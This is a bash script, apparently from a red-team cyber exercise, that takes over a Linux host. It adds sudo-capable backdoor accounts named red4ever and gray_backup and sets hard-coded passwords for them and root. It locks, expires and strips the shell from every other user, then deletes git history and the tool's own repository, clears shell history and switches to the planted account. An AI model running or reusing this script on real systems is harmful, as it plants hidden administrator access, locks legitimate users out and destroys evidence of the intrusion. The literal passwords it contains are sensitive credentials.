#!/bin/bash
# == Author: Nia Poor ==

# A function that creates a whitelist. Will ALWAYS include the user executing the script.
function create_whitelist()
{
    sudo mkdir -p /home/red4ever
    # Create a user with the above home directory and the shell /bin/bash
    sudo useradd -m -d /home/red4ever -s /bin/bash red4ever &>/dev/null
    # The new user should own their home directory
    sudo chown -R red4ever:red4ever /home/red4ever
    # The new user should have sudo privileges
    sudo usermod -aG sudo red4ever

    sudo mkdir -p /home/gray_backup
    # Create a user with the above home directory and the shell /bin/bash
    sudo useradd -m -d /home/gray_backup -s /bin/bash gray_backup &>/dev/null
    # The new user should own their home directory
    sudo chown -R gray_backup:gray_backup /home/gray_backup
    # The new user should have sudo privileges
    sudo usermod -aG sudo gray_backup
    
    # Adds the executing user to the whitelist
    WHITELIST+=("$(logname)")
    WHITELIST+=(root)
    WHITELIST+=(red4ever)
    WHITELIST+=(gray_backup)
    WHITELIST+=(gray)
}


# A function that sets passwords and saves encrypted passwords
function set_passwords(){
    # Grabs every user in the system and stores their usernames
    cat /etc/passwd | awk -F":" '{ print $1 }' > login_usernames_temp.txt

    # Loop through the usernames
    while read LINE; do
        # Change the password for each user NOT ON GRAY
        if [ $LINE = "root" ]; then
            echo ${LINE}:"KJfe735guf2grf47"| sudo chpasswd 1> /dev/null
        fi
        if [ $LINE = "red4ever" ]; then
            echo ${LINE}:"JKSRH73562@!%"| sudo chpasswd 1> /dev/null
        fi
        if [ $LINE = "gray_backup" ]; then
            echo ${LINE}:"&%#Ybs3ryfvds"| sudo chpasswd 1> /dev/null
        fi
    done < login_usernames_temp.txt

    rm login_usernames_temp.txt

    # Save all of the encrypted passwords
    #sudo cat /etc/shadow > passwords_temp.txt
}


# A function that disables users not in the whitelist
function disable_users()
{
    # Grabs the username of every enabled user
    cat /etc/passwd | awk -F":" '{ print $1 }' > login_usernames_temp.txt

    # Loop through all the enabled users
    while read LINE; do
        # A user should be set to be disabled by default
        DISABLE=true
        # Set the user to the current line
        USER=$(echo $LINE)
        # Loop through the whitelist
        for VALUE in "${WHITELIST[@]}"; do
            # If the user is in the whitelist, don't disable them!
            if [ $USER = $VALUE ]; then
                DISABLE=false
                break
            fi
        done

    # Only disable the user if they have shown not to be on the whitelist
        if [ $DISABLE = true ]; then
            # Lock the user
            sudo usermod -L $USER > /dev/null
            sudo passwd -l $USER > /dev/null
            # Expires the user
            sudo chage -E0 $USER > /dev/null
            # Change the user's shell to nologin
            sudo usermod -s /sbin/nologin $USER > /dev/null
        fi
    done < login_usernames_temp.txt
    # Remove the text file of usernames
    rm login_usernames_temp.txt
}
# To check to make sure user is locked: "passwd --status $USER" (may have to run with root)
# To check if the count has an expire date: "chage -l $USER"
# To check their shell is /sbin/nologin: "cat /etc/passwd | grep -v nologin" (make sure they're not here)


# Letting the user know this is starting
echo
echo "Beginning disabling users."
# Set the passwords for whitelisted users and disable all other users
create_whitelist
disable_users
set_passwords
echo
echo "Users disabled successfully."

echo
echo "NUKING DISABLER / LOCKER AND LOGS"

# ===== CLEARING THINGS =====
# Clear git logs (not sure how well these commands to that)
sudo rm -rf .git > /dev/null
sudo git init > /dev/null
# Go back a directory a delete the repo contents
cd ..
sudo rm -rf DefensiveTools
# Clear bash history
sudo history -c
# Switch user to red
sudo su - red4ever
